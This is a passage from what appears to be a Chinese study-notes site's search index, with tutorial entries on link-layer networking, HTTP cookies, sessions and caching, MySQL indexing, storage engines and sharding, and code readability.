。只有经过争用期之后还没有检测到碰撞，才能肯定这次发送不会发生碰撞。\n当发生碰撞时，站点要停止发送，等待一段时间再发送。这个时间采用\n截断二进制指数退避算法 来确定。从离散的整数集合 {0, 1, .., (2k-1)} 中随机取出一个数，记作 r，然后取 r 倍的争用期作为重传等待时间。\nPPP 协议 # 互联网用户通常需要连接到某个 ISP 之后才能接入到互联网，PPP 协议是用户计算机和 ISP 进行通信时所使用的数据链路层协议。\nPPP 的帧格式：\nF 字段为帧的定界符 A 和 C 字段暂时没有意义 FCS 字段是使用 CRC 的检验序列 信息部分的长度不超过 1500 MAC 地址 # MAC 地址是链路层地址，长度为 6 字节（48 位），用于唯一标识网络适配器（网卡）。\n一台主机拥有多少个网络适配器就有多少个 MAC 地址。例如笔记本电脑普遍存在无线网络适配器和有线网络适配器，因此就有两个 MAC 地址。\n局域网 # 局域网是一种典型的广播信道，主要特点是网络为一个单位所拥有，且地理范围和站点数目均有限。\n主要有以太网、令牌环网、FDDI 和 ATM 等局域网技术，目前以太网占领着有线局域网市场。\n可以按照网络拓扑结构对局域网进行分类：\n以太网 # 以太网是一种星型拓扑结构局域网。\n早期使用集线器进行连接，集线器是一种物理层设备， 作用于比特而不是帧，当一个比特到达接口时，集线器重新生成这个比特，并将其能量强度放大，从而扩大网络的传输距离，之后再将这个比特发送到其它所有接口。如果集线器同时收到两个不同接口的帧，那么就发生了碰撞。\n目前以太网使用交换机替代了集线器，交换机是一种链路层设备，它不会发生碰撞，能根据 MAC 地址进行存储转发。\n以太网帧格式：\n类型 ：标记上层使用的协议； 数据 ：长度在 46-1500 之间，如果太小则需要填充； FCS ：帧检验序列，使用的是 CRC 检验方法； 交换机 # 交换机具有自学习能力，学习的是交换表的内容，交换表中存储着 MAC 地址到接口的映射。\n正是由于这种自学习能力，因此交换机是一种即插即用设备，不需要网络管理员手动配置交换表内容。\n下图中，交换机有 4 个接口，主机 A 向主机 B 发送数据帧时，交换机把主机 A 到接口 1 的映射写入交换表中。为了发送数据帧到 B，先查交换表，此时没有主机 B 的表项，那么主机 A 就发送广播帧，主机 C 和主机 D 会丢弃该帧，主机 B 回应该帧向主机 A 发送数据包时，交换机查找交换表得到主机 A 映射的接口为 1，就发送数据帧到接口 1，同时交换机添加主机 B 到接口 2 的映射。\n虚拟局域网 # 虚拟局域网可以建立与物理位置无关的逻辑组，只有在同一个虚拟局域网中的成员才会收到链路层广播信息。\n例如下图中 (A1, A2, A3, A4) 属于一个虚拟局域网，A1 发送的广播会被 A2、A3、A4 收到，而其它站点收不到。\n使用 VLAN 干线连接来建立虚拟局域网，每台交换机上的一个特殊接口被设置为干线接口，以互连 VLAN 交换机。IEEE 定义了一种扩展的以太网帧格式 802.1Q，它在标准以太网帧上加进了 4 字节首部 VLAN 标签，用于表示该帧属于哪一个虚拟局域网。\n"},{"id":21,"href":"/keeplearning/docs/http/http2/","title":"HTTP（二）","section":"HTTP","content":" HTTP（二） # 具体应用 # 连接管理 # 短连接与长连接 # 当浏览器访问一个包含多张图片的 HTML 页面时，除了请求访问的 HTML 页面资源，还会请求图片资源。如果每进行一次 HTTP 通信就要新建一个 TCP 连接，那么开销会很大。\n长连接只需要建立一次 TCP 连接就能进行多次 HTTP 通信。\n从 HTTP/1.1 开始默认是长连接的，如果要断开连接，需要由客户端或者服务器端提出断开，使用Connection : close； 在 HTTP/1.1 之前默认是短连接的，如果需要使用长连接，则使用Connection : Keep-Alive。 流水线 # 默认情况下，HTTP 请求是按顺序发出的，下一个请求只有在当前请求收到响应之后才会被发出。由于受到网络延迟和带宽的限制，在下一个请求被发送到服务器之前，可能需要等待很长时间。\n流水线是在同一条长连接上连续发出请求，而不用等待响应返回，这样可以减少延迟。\nCookie # HTTP 协议是无状态的，主要是为了让 HTTP 协议尽可能简单，使得它能够处理大量事务。HTTP/1.1 引入 Cookie 来保存状态信息。\nCookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器之后向同一服务器再次发起请求时被携带上，用于告知服务端两个请求是否来自同一浏览器。由于之后每次请求都会需要携带 Cookie 数据，因此会带来额外的性能开销（尤其是在移动环境下）。\nCookie 曾一度用于客户端数据的存储，因为当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 Web storage API（本地存储和会话存储）或 IndexedDB。\n1. 用途 # 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息） 个性化设置（如用户自定义设置、主题等） 浏览器行为跟踪（如跟踪分析用户行为等） 2. 创建过程 # 服务器发送的响应报文包含 Set-Cookie 首部字段，客户端得到响应报文后把 Cookie 内容保存到浏览器中。\nHTTP/1.0 200 OK Content-type: text/html Set-Cookie: yummy_cookie=choco Set-Cookie: tasty_cookie=strawberry [page content] 客户端之后对同一个服务器发送请求时，会从浏览器中取出 Cookie 信息并通过 Cookie 请求首部字段发送给服务器。\nGET /sample_page.html HTTP/1.1 Host: www.example.org Cookie: yummy_cookie=choco; tasty_cookie=strawberry 3. 分类 # 会话期 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。 持久性 Cookie：指定过期时间（Expires）或有效期（max-age）之后就成为了持久性的 Cookie。 Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; 4. 作用域 # Domain 标识指定了哪些主机可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了 Domain，则一般包含子域名。例如，如果设置 Domain=mozilla.org，则 Cookie 也包含在子域名中（如 developer.mozilla.org）。\nPath 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 %x2F (\u0026quot;/\u0026quot;) 作为路径分隔符，子路径也会被匹配。例如，设置 Path=/docs，则以下地址都会匹配：\n/docs /docs/Web/ /docs/Web/HTTP 5. JavaScript # 浏览器通过document.cookie属性可创建新的 Cookie，也可通过该属性访问非 HttpOnly 标记的 Cookie。\ndocument.cookie = \u0026#34;yummy_cookie=choco\u0026#34;; document.cookie = \u0026#34;tasty_cookie=strawberry\u0026#34;; console.log(document.cookie); 6. HttpOnly # 标记为 HttpOnly 的 Cookie 不能被 JavaScript 脚本调用。跨站脚本攻击 (XSS) 常常使用 JavaScript 的 document.cookie API 窃取用户的 Cookie 信息，因此使用 HttpOnly 标记可以在一定程度上避免 XSS 攻击。\nSet-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly 7. Secure # 标记为 Secure 的 Cookie 只能通过被 HTTPS 协议加密过的请求发送给服务端。但即便设置了 Secure 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，Secure 标记也无法提供确实的安全保障。\n8. Session # 除了可以将用户信息通过 Cookie 存储在用户浏览器中，也可以利用 Session 存储在服务器端，存储在服务器端的信息更加安全。\nSession 可以存储在服务器上的文件、数据库或者内存中。也可以将 Session 存储在 Redis 这种内存型数据库中，效率会更高。\n使用 Session 维护用户登录状态的过程如下：\n用户进行登录时，用户提交包含用户名和密码的表单，放入 HTTP 请求报文中； 服务器验证该用户名和密码，如果正确则把用户信息存储到 Redis 中，它在 Redis 中的 Key 称为 Session ID； 服务器返回的响应报文的 Set-Cookie 首部字段包含了这个 Session ID，客户端收到响应报文之后将该 Cookie 值存入浏览器中； 客户端之后对同一个服务器进行请求时会包含该 Cookie 值，服务器收到之后提取出 Session ID，从 Redis 中取出用户信息，继续之前的业务操作。 应该注意 Session ID 的安全性问题，不能让它被恶意攻击者轻易获取，那么就不能产生一个容易被猜到的 Session ID 值。此外，还需要经常重新生成 Session ID。在对安全性要求极高的场景下，例如转账等操作，除了使用 Session 管理用户状态之外，还需要对用户进行重新验证，比如重新输入密码，或者使用短信验证码等方式。\n9. 浏览器禁用 Cookie # 此时无法使用 Cookie 来保存用户信息，只能使用 Session。除此之外，不能再将 Session ID 存放到 Cookie 中，而是使用 URL 重写技术，将 Session ID 作为 URL 的参数进行传递。\n10. Cookie 与 Session 选择 # Cookie 只能存储 ASCII 码字符串，而 Session 则可以存储任何类型的数据，因此在考虑数据复杂性时首选 Session； Cookie 存储在浏览器中，容易被恶意查看。如果非要将一些隐私数据存在 Cookie 中，可以将 Cookie 值进行加密，然后在服务器进行解密； 对于大型网站，如果用户所有的信息都存储在 Session 中，那么开销是非常大的，因此不建议将所有的用户信息都存储到 Session 中。 缓存 # 1. 优点 # 缓解服务器压力； 降低客户端获取资源的延迟：缓存通常位于内存中，读取缓存的速度更快。并且缓存服务器在地理位置上也有可能比源服务器来得近，例如浏览器缓存。\n2. 实现方法 # 让代理服务器进行缓存； 让客户端浏览器进行缓存。\n3. Cache-Control # HTTP/1.1 通过 Cache-Control 首部字段来控制缓存。\n3.1 禁止进行缓存 # no-store 指令规定不能对请求或响应的任何一部分进行缓存。\nCache-Control: no-store 3.2 强制确认缓存 # no-cache 指令规定缓存服务器需要先向源服务器验证缓存资源的有效性，只有当缓存资源有效时才能使用该缓存对客户端的请求进行响应。\nCache-Control: no-cache 3.3 私有缓存和公共缓存 # private 指令规定了将资源作为私有缓存，只能被单独用户使用，一般存储在用户浏览器中。\nCache-Control: private public 指令规定了将资源作为公共缓存，可以被多个用户使用，一般存储在代理服务器中。\nCache-Control: public 3.4 缓存过期机制 # max-age 指令出现在请求报文，并且缓存资源的缓存时间小于该指令指定的时间，那么就能接受该缓存。\nmax-age 指令出现在响应报文，表示缓存资源在缓存服务器中保存的时间。\nCache-Control: max-age=31536000 Expires 首部字段也可以用于告知缓存服务器该资源什么时候会过期。\nExpires: Wed, 04 Jul 2012 08:26:05 GMT 在 HTTP/1.1 中，会优先处理 max-age 指令； 在 HTTP/1.0 中，max-age 指令会被忽略掉。 4. 缓存验证 # 需要先了解 ETag 首部字段的含义，它是资源的唯一标识。URL 不能唯一表示资源，例如http://www.google.com/ 有中文和英文两个资源，只有 ETag 才能对这两个资源进行唯一标识。\nETag: \u0026#34;82e22293907ce725faf67773957acd12\u0026#34; 可以将缓存资源的 ETag 值放入 If-None-Match 首部，服务器收到该请求后，判断缓存资源的 ETag 值和资源的最新 ETag 值是否一致，如果一致则表示缓存资源有效，返回 304 Not Modified。\nIf-None-Match: \u0026#34;82e22293907ce725faf67773957acd12\u0026#34; Last-Modified 首部字段也可以用于缓存验证，它包含在源服务器发送的响应报文中，指示源服务器对资源的最后修改时间。但是它是一种弱校验器，因为只能精确到一秒，所以它通常作为 ETag 的备用方案。如果响应首部字段里含有这个信息，客户端可以在后续的请求中带上 If-Modified-Since 来验证缓存。服务器只在所请求的资源在给定的日期时间之后对内容进行过修改的情况下才会将资源返回，状态码为 200 OK。如果请求的资源从那时起未经修改，那么返回一个不带有实体主体的 304 Not Modified 响应报文。\nLast-Modified: Wed, 21 Oct 2015 07:28:00 GMT If-Modified-Since: Wed, 21 Oct 2015 07:28:00 GMT 内容协商 # 通过内容协商返回最合适的内容，例如根据浏览器的默认语言选择返回中文界面还是英文界面。\n1. 类型 # 1.1 服务端驱动型 # 客户端设置特定的 HTTP 首部字段，例如 Accept、Accept-Charset、Accept-Encoding、Accept-Language，服务器根据这些字段返回特定的资源。\n它存在以下问题：\n服务器很难知道客户端浏览器的全部信息； 客户端提供的信息相当冗长（HTTP/2 协议的首部压缩机制缓解了这个问题），并且存在隐私风险（HTTP 指纹识别技术）； 给定的资源需要返回不同的展现形式，共享缓存的效率会降低，而服务器端的实现会越来越复杂。 1.2 代理驱动型 # 服务器返回 300 Multiple Choices 或者 406 Not Acceptable，客户端从中选出最合适的那个资源。\n2. Vary # Vary: Accept-Language 在使用内容协商的情况下，只有当缓存服务器中的缓存满足内容协商条件时，才能使用该缓存，否则应该向源服务器请求该资源。\n例如，一个客户端发送了一个包含 Accept-Language 首部字段的请求之后，源服务器返回的响应包含Vary: Accept-Language内容，缓存服务器对这个响应进行缓存之后，在客户端下一次访问同一个 URL 资源，并且 Accept-Language 与缓存中的对应的值相同时才会返回该缓存。\n内容编码 # 内容编码将实体主体进行压缩，从而减少传输的数据量。\n常用的内容编码有：gzip、compress、deflate、identity。\n浏览器发送 Accept-Encoding 首部，其中包含有它所支持的压缩算法，以及各自的优先级。服务器则从中选择一种，使用该算法对响应的消息主体进行压缩，并且发送 Content-Encoding 首部来告知浏览器它选择了哪一种算法。由于该内容协商过程是基于编码类型来选择资源的展现形式的，响应报文的 Vary 首部字段至少要包含 Content-Encoding。\n范围请求 # 如果网络出现中断，服务器只发送了一部分数据，范围请求可以使得客户端只请求服务器未发送的那部分数据，从而避免服务器重新发送所有数据。\n1. Range # 在请求报文中添加 Range 首部字段指定请求的范围。\nGET /z4d4kWk.jpg HTTP/1.1 Host: i.imgur.com Range: bytes=0-1023 请求成功的话服务器返回的响应包含 206 Partial Content 状态码。\nHTTP/1.1 206 Partial Content Content-Range: bytes 0-1023/146515 Content-Length: 1024 ... (binary content) 2. Accept-Ranges # 响应首部字段 Accept-Ranges 用于告知客户端是否能处理范围请求，可以处理使用 bytes，否则使用 none。\nAccept-Ranges: bytes 3. 响应状态码 # 在请求成功的情况下，服务器会返回 206 Partial Content 状态码。 在请求的范围越界的情况下，服务器会返回 416 Requested Range Not Satisfiable 状态码。 在不支持范围请求的情况下，服务器会返回 200 OK 状态码。 分块传输编码 # Chunked Transfer Encoding，可以把数据分割成多块，让浏览器逐步显示页面。\n多部分对象集合 # 一份报文主体内可含有多种类型的实体同时发送，每个部分之间用 boundary 字段定义的分隔符进行分隔，每个部分都可以有首部字段。\n例如，上传多个表单时可以使用如下方式：\nContent-Type: multipart/form-data; boundary=AaB03x --AaB03x Content-Disposition: form-data; name=\u0026#34;submit-name\u0026#34; Larry --AaB03x Content-Disposition: form-data; name=\u0026#34;files\u0026#34;; filename=\u0026#34;file1.txt\u0026#34; Content-Type: text/plain ... contents of file1.txt ... --AaB03x-- 虚拟主机 # HTTP/1.1 使用虚拟主机技术，使得一台服务器拥有多个域名，并且在逻辑上可以看成多个服务器。\n"},{"id":22,"href":"/keeplearning/docs/mysql/mysql-faq1/","title":"MySQL","section":"MySQL","content":" MySQL # 一、索引 # B+ Tree 原理 # 1. 数据结构 # B Tree 指的是 Balance Tree，也就是平衡树。平衡树是一颗查找树，并且所有叶子节点位于同一层。\nB+ Tree 是基于 B Tree 和叶子节点顺序访问指针进行实现，它具有 B Tree 的平衡性，并且通过顺序访问指针来提高区间查询的性能。\n在 B+ Tree 中，一个节点中的 key 从左到右非递减排列，如果某个指针的左右相邻 key 分别是 keyi 和 keyi+1，且不为 null，则该指针指向节点的所有 key 大于等于 keyi 且小于等于 keyi+1。\n2. 操作 # 进行查找操作时，首先在根节点进行二分查找，找到一个 key 所在的指针，然后递归地在指针所指向的节点进行查找。直到查找到叶子节点，然后在叶子节点上进行二分查找，找出 key 所对应的 data。\n插入删除操作会破坏平衡树的平衡性，因此在进行插入删除操作之后，需要对树进行分裂、合并、旋转等操作来维护平衡性。\n3. 与红黑树的比较 # 红黑树等平衡树也可以用来实现索引，但是文件系统及数据库系统普遍采用 B+ Tree 作为索引结构，这是因为使用 B+ 树访问磁盘数据有更高的性能。\n（一）B+ 树有更低的树高\n平衡树的树高 O(h)=O(logdN)，其中 d 为每个节点的出度。红黑树的出度为 2，而 B+ Tree 的出度一般都非常大，所以红黑树的树高 h 很明显比 B+ Tree 大非常多。\n（二）磁盘访问原理\n操作系统一般将内存和磁盘分割成固定大小的块，每一块称为一页，内存与磁盘以页为单位交换数据。数据库系统将索引的一个节点的大小设置为页的大小，使得一次 I/O 就能完全载入一个节点。\n如果数据不在同一个磁盘块上，那么通常需要移动制动手臂进行寻道，而制动手臂因为其物理结构导致了移动效率低下，从而增加磁盘数据读取时间。B+ 树相对于红黑树有更低的树高，进行寻道的次数与树高成正比，在同一个磁盘块上进行访问只需要很短的磁盘旋转时间，所以 B+ 树更适合磁盘数据的读取。\n（三）磁盘预读特性\n为了减少磁盘 I/O 操作，磁盘往往不是严格按需读取，而是每次都会预读。预读过程中，磁盘进行顺序读取，顺序读取不需要进行磁盘寻道，并且只需要很短的磁盘旋转时间，速度会非常快。并且可以利用预读特性，相邻的节点也能够被预先载入。\nMySQL 索引 # 索引是在存储引擎层实现的，而不是在服务器层实现的，所以不同存储引擎具有不同的索引类型和实现。\n1. B+Tree 索引 # 是大多数 MySQL 存储引擎的默认索引类型。\n因为不再需要进行全表扫描，只需要对树进行搜索即可，所以查找速度快很多。\n因为 B+ Tree 的有序性，所以除了用于查找，还可以用于排序和分组。\n可以指定多个列作为索引列，多个索引列共同组成键。\n适用于全键值、键值范围和键前缀查找，其中键前缀查找只适用于最左前缀查找。如果不是按照索引列的顺序进行查找，则无法使用索引。\nInnoDB 的 B+Tree 索引分为主索引和辅助索引。主索引的叶子节点 data 域记录着完整的数据记录，这种索引方式被称为聚簇索引。因为无法把数据行存放在两个不同的地方，所以一个表只能有一个聚簇索引。\n辅助索引的叶子节点的 data 域记录着主键的值，因此在使用辅助索引进行查找时，需要先查找到主键值，然后再到主索引中进行查找。\n2. 哈希索引 # 哈希索引能以 O(1) 时间进行查找，但是失去了有序性：\n无法用于排序与分组； 只支持精确查找，无法用于部分查找和范围查找。 InnoDB 存储引擎有一个特殊的功能叫“自适应哈希索引”，当某个索引值被使用的非常频繁时，会在 B+Tree 索引之上再创建一个哈希索引，这样就让 B+Tree 索引具有哈希索引的一些优点，比如快速的哈希查找。\n3. 全文索引 # MyISAM 存储引擎支持全文索引，用于查找文本中的关键词，而不是直接比较是否相等。\n查找条件使用 MATCH AGAINST，而不是普通的 WHERE。\n全文索引使用倒排索引实现，它记录着关键词到其所在文档的映射。\nInnoDB 存储引擎在 MySQL 5.6.4 版本中也开始支持全文索引。\n4. 空间数据索引 # MyISAM 存储引擎支持空间数据索引（R-Tree），可以用于地理数据存储。空间数据索引会从所有维度来索引数据，可以有效地使用任意维度来进行组合查询。\n必须使用 GIS 相关的函数来维护数据。\n索引优化 # 1. 独立的列 # 在进行查询时，索引列不能是表达式的一部分，也不能是函数的参数，否则无法使用索引。\n例如下面的查询不能使用 actor_id 列的索引：\nSELECT actor_id FROM sakila.actor WHERE actor_id + 1 = 5; 2. 多列索引 # 在需要使用多个列作为条件进行查询时，使用多列索引比使用多个单列索引性能更好。例如下面的语句中，最好把 actor_id 和 film_id 设置为多列索引。\nSELECT film_id, actor_ id FROM sakila.film_actor WHERE actor_id = 1 AND film_id = 1; 3. 索引列的顺序 # 让选择性最强的索引列放在前面。\n索引的选择性是指：不重复的索引值和记录总数的比值。最大值为 1，此时每个记录都有唯一的索引与其对应。选择性越高，每个记录的区分度越高，查询效率也越高。\n例如下面显示的结果中 customer_id 的选择性比 staff_id 更高，因此最好把 customer_id 列放在多列索引的前面。\nSELECT COUNT(DISTINCT staff_id)/COUNT(*) AS staff_id_selectivity, COUNT(DISTINCT customer_id)/COUNT(*) AS customer_id_selectivity, COUNT(*) FROM payment; staff_id_selectivity: 0.0001 customer_id_selectivity: 0.0373 COUNT(*): 16049 4. 前缀索引 # 对于 BLOB、TEXT 和 VARCHAR 类型的列，必须使用前缀索引，只索引开始的部分字符。\n前缀长度的选取需要根据索引选择性来确定。\n5. 覆盖索引 # 索引包含所有需要查询的字段的值。\n具有以下优点：\n索引通常远小于数据行的大小，只读取索引能大大减少数据访问量。 一些存储引擎（例如 MyISAM）在内存中只缓存索引，而数据依赖于操作系统来缓存。因此，只访问索引可以不使用系统调用（通常比较费时）。 对于 InnoDB 引擎，若辅助索引能够覆盖查询，则无需访问主索引。 索引的优点 # 大大减少了服务器需要扫描的数据行数。\n帮助服务器避免进行排序和分组，以及避免创建临时表（B+Tree 索引是有序的，可以用于 ORDER BY 和 GROUP BY 操作。临时表主要是在排序和分组过程中创建，不需要排序和分组，也就不需要创建临时表）。\n将随机 I/O 变为顺序 I/O（B+Tree 索引是有序的，会将相邻的数据都存储在一起）。\n索引的使用条件 # 对于非常小的表、大部分情况下简单的全表扫描比建立索引更高效；\n对于中到大型的表，索引就非常有效；\n但是对于特大型的表，建立和维护索引的代价将会随之增长。这种情况下，需要用到一种技术可以直接区分出需要查询的一组数据，而不是一条记录一条记录地匹配，例如可以使用分区技术。\n二、查询性能优化 # 使用 Explain 进行分析 # Explain 用来分析 SELECT 查询语句，开发人员可以通过分析 Explain 结果来优化查询语句。\n比较重要的字段有：\nselect_type : 查询类型，有简单查询、联合查询、子查询等 key : 使用的索引 rows : 扫描的行数 优化数据访问 # 1. 减少请求的数据量 # 只返回必要的列：最好不要使用 SELECT * 语句。 只返回必要的行：使用 LIMIT 语句来限制返回的数据。 缓存重复查询的数据：使用缓存可以避免在数据库中进行查询，特别在要查询的数据经常被重复查询时，缓存带来的查询性能提升将会是非常明显的。 2. 减少服务器端扫描的行数 # 最有效的方式是使用索引来覆盖查询。\n重构查询方式 # 1. 切分大查询 # 一个大查询如果一次性执行的话，可能一次锁住很多数据、占满整个事务日志、耗尽系统资源、阻塞很多小的但重要的查询。\nDELETE FROM messages WHERE create \u0026lt; DATE_SUB(NOW(), INTERVAL 3 MONTH); rows_affected = 0 do { rows_affected = do_query( \u0026#34;DELETE FROM messages WHERE create \u0026lt; DATE_SUB(NOW(), INTERVAL 3 MONTH) LIMIT 10000\u0026#34;) } while rows_affected \u0026gt; 0 2. 分解大连接查询 # 将一个大连接查询分解成对每一个表进行一次单表查询，然后在应用程序中进行关联，这样做的好处有：\n让缓存更高效。对于连接查询，如果其中一个表发生变化，那么整个查询缓存就无法使用。而分解后的多个查询，即使其中一个表发生变化，对其它表的查询缓存依然可以使用。 分解成多个单表查询，这些单表查询的缓存结果更可能被其它查询使用到，从而减少冗余记录的查询。 减少锁竞争； 在应用层进行连接，可以更容易对数据库进行拆分，从而更容易做到高性能和可伸缩。 查询本身效率也可能会有所提升。例如下面的例子中，使用 IN() 代替连接查询，可以让 MySQL 按照 ID 顺序进行查询，这可能比随机的连接要更高效。 SELECT * FROM tag JOIN tag_post ON tag_post.tag_id=tag.id JOIN post ON tag_post.post_id=post.id WHERE tag.tag=\u0026#39;mysql\u0026#39;; SELECT * FROM tag WHERE tag=\u0026#39;mysql\u0026#39;; SELECT * FROM tag_post WHERE tag_id=1234; SELECT * FROM post WHERE post.id IN (123,456,567,9098,8904); 三、存储引擎 # InnoDB # 是 MySQL 默认的事务型存储引擎，只有在需要它不支持的特性时，才考虑使用其它存储引擎。\n实现了四个标准的隔离级别，默认级别是可重复读（REPEATABLE READ）。在可重复读隔离级别下，通过多版本并发控制（MVCC）+ Next-Key Locking 防止幻影读。\n主索引是聚簇索引，在索引中保存了数据，从而避免直接读取磁盘，因此对查询性能有很大的提升。\n内部做了很多优化，包括从磁盘读取数据时采用的可预测性读、能够加快读操作并且自动创建的自适应哈希索引、能够加速插入操作的插入缓冲区等。\n支持真正的在线热备份。其它存储引擎不支持在线热备份，要获取一致性视图需要停止对所有表的写入，而在读写混合场景中，停止写入可能也意味着停止读取。\nMyISAM # 设计简单，数据以紧密格式存储。对于只读数据，或者表比较小、可以容忍修复操作，则依然可以使用它。\n提供了大量的特性，包括压缩表、空间数据索引等。\n不支持事务。\n不支持行级锁，只能对整张表加锁，读取时会对需要读到的所有表加共享锁，写入时则对表加排它锁。但在表有读取操作的同时，也可以往表中插入新的记录，这被称为并发插入（CONCURRENT INSERT）。\n可以手工或者自动执行检查和修复操作，但是和事务恢复以及崩溃恢复不同，可能导致一些数据丢失，而且修复操作是非常慢的。\n如果指定了 DELAY_KEY_WRITE 选项，在每次修改执行完成时，不会立即将修改的索引数据写入磁盘，而是会写到内存中的键缓冲区，只有在清理键缓冲区或者关闭表的时候才会将对应的索引块写入磁盘。这种方式可以极大的提升写入性能，但是在数据库或者主机崩溃时会造成索引损坏，需要执行修复操作。\n比较 # 事务：InnoDB 是事务型的，可以使用 Commit 和 Rollback 语句。\n并发：MyISAM 只支持表级锁，而 InnoDB 还支持行级锁。\n外键：InnoDB 支持外键。\n备份：InnoDB 支持在线热备份。\n崩溃恢复：MyISAM 崩溃后发生损坏的概率比 InnoDB 高很多，而且恢复的速度也更慢。\n其它特性：MyISAM 支持压缩表和空间数据索引。\n四、数据类型 # 整型 # TINYINT, SMALLINT, MEDIUMINT, INT, BIGINT 分别使用 8, 16, 24, 32, 64 位存储空间，一般情况下越小的列越好。\nINT(11) 中的数字只是规定了交互工具显示字符的个数，对于存储和计算来说是没有意义的。\n浮点数 # FLOAT 和 DOUBLE 为浮点类型，DECIMAL 为高精度小数类型。CPU 原生支持浮点运算，但是不支持 DECIMAl 类型的计算，因此 DECIMAL 的计算比浮点类型需要更高的代价。\nFLOAT、DOUBLE 和 DECIMAL 都可以指定列宽，例如 DECIMAL(18, 9) 表示总共 18 位，取 9 位存储小数部分，剩下 9 位存储整数部分。\n字符串 # 主要有 CHAR 和 VARCHAR 两种类型，一种是定长的，一种是变长的。\nVARCHAR 这种变长类型能够节省空间，因为只需要存储必要的内容。但是在执行 UPDATE 时可能会使行变得比原来长，当超出一个页所能容纳的大小时，就要执行额外的操作。MyISAM 会将行拆成不同的片段存储，而 InnoDB 则需要分裂页来使行放进页内。\n在进行存储和检索时，会保留 VARCHAR 末尾的空格，而会删除 CHAR 末尾的空格。\n时间和日期 # MySQL 提供了两种相似的日期时间类型：DATETIME 和 TIMESTAMP。\n1. DATETIME # 能够保存从 1000 年到 9999 年的日期和时间，精度为秒，使用 8 字节的存储空间。\n它与时区无关。\n默认情况下，MySQL 以一种可排序的、无歧义的格式显示 DATETIME 值，例如“2008-01-16 22:37:08”，这是 ANSI 标准定义的日期和时间表示方法。\n2. TIMESTAMP # 和 UNIX 时间戳相同，保存从 1970 年 1 月 1 日午夜（格林威治时间）以来的秒数，使用 4 个字节，只能表示从 1970 年到 2038 年。\n它和时区有关，也就是说一个时间戳在不同的时区所代表的具体时间是不同的。\nMySQL 提供了 FROM_UNIXTIME() 函数把 UNIX 时间戳转换为日期，并提供了 UNIX_TIMESTAMP() 函数把日期转换为 UNIX 时间戳。\n默认情况下，如果插入时没有指定 TIMESTAMP 列的值，会将这个值设置为当前时间。\n应该尽量使用 TIMESTAMP，因为它比 DATETIME 空间效率更高。\n五、切分 # 水平切分 # 水平切分又称为 Sharding，它是将同一个表中的记录拆分到多个结构相同的表中。\n当一个表的数据不断增多时，Sharding 是必然的选择，它可以将数据分布到集群的不同节点上，从而缓存单个数据库的压力。\n垂直切分 # 垂直切分是将一张表按列切分成多个表，通常是按照列的关系密集程度进行切分，也可以利用垂直切分将经常被使用的列和不经常被使用的列切分到不同的表中。\n在数据库的层面使用垂直切分将按数据库中表的密集程度部署到不同的库中，例如将原来的电商数据库垂直切分成商品数据库、用户数据库等。\nSharding 策略 # 哈希取模：hash(key) % N； 范围：可以是 ID 范围也可以是时间范围； 映射表：使用单独的一个数据库来存储映射关系。 Sharding 存在的问题 # 1. 事务问题 # 使用分布式事务来解决，比如 XA 接口。\n2. 连接 # 可以将原来的连接分解成多个单表查询，然后在用户程序中进行连接。\n3. ID 唯一性 # 使用全局唯一 ID（GUID） 为每个分片指定一个 ID 范围 分布式 ID 生成器 (如 Twitter 的 Snowflake 算法) 六、复制 # 主从复制 # 主要涉及三个线程：binlog 线程、I/O 线程和 SQL 线程。\nbinlog 线程 ：负责将主服务器上的数据更改写入二进制日志（Binary log）中。 I/O 线程 ：负责从主服务器上读取二进制日志，并写入从服务器的中继日志（Relay log）。 SQL 线程 ：负责读取中继日志，解析出主服务器已经执行的数据更改并在从服务器中重放（Replay）。 读写分离 # 主服务器处理写操作以及实时性要求比较高的读操作，而从服务器处理读操作。\n读写分离能提高性能的原因在于：\n主从服务器负责各自的读和写，极大程度缓解了锁的争用； 从服务器可以使用 MyISAM，提升查询性能以及节约系统开销； 增加冗余，提高可用性。 读写分离常用代理方式来实现，代理服务器接收应用层传来的读写请求，然后决定转发到哪个服务器。\n"},{"id":23,"href":"/keeplearning/docs/coding-practice/code-readability/","title":"代码可读性","section":"编码实践","content":" 一、可读性的重要性 # 编程有很大一部分时间是在阅读代码，不仅要阅读自己的代码，而且要阅读别人的代码。因此，可读性良好的代码能够大大提高编程效率。\n可读性良好的代码往往会让代码架构更好，因为程序员更愿意去修改这部分代码，而且也更容易修改。\n只有在核心领域为了效率才可以放弃可读性，否则可读性是第一位。\n二、用名字表达代码含义 # 一些比较有表达力的单词：\n单词 可替代单词 send deliver、dispatch、announce、distribute、route find search、extract、locate、recover start launch、create、begin、open make create、set up、build、generate、compose、add、new 使用 i、j、k 作为循环迭代器的名字过于简单，user_i、member_i 这种名字会更有表达力。因为循环层次越多，代码越难理解，有表达力的迭代器名字可读性会更高。\n为名字添加形容词等信息能让名字更具有表达力，但是名字也会变长。名字长短的准则是：作用域越大，名字越长。因此只有在短作用域才能使用一些简单名字。\n三、名字不能带来歧义 # 起完名字要思考一下别人会对这个名字有何解读，会不会误解了原本想表达的含义。\n布尔相关的命名加上 is、can、should、has 等前缀。\n用 min、max 表示数量范围；\n用 first、last 表示访问空间的包含范围；\nbegin、end 表示访问空间的排除范围，即 end 不包含尾部。\n四、良好的代码风格 # 适当的空行和缩进。\n排列整齐的注释：\nint a = 1; // 注释 int b = 11; // 注释 int c = 111; // 注释 语句顺序不能随意，比如与 html 表单相关联的变量的赋值应该和表单在 html 中的顺序一致。\n五、为何编写注释 # 阅读代码首先会注意到注释，如果注释没太大作用，那么就会浪费代码阅读的时间。那些能直接看出含义的代码不需要写注释，特别是不需要为每个方法都加上注释，比如那些简单的 getter 和 setter 方法，为这些方法写注释反而让代码可读性更差。\n不能因为有注释就随便起个名字，而是争取起个好名字而不写注释。\n可以用注释来记录采用当前解决办法的思考过程，从而让读者更容易理解代码。\n注释用来提醒一些特殊情况。\n用 TODO 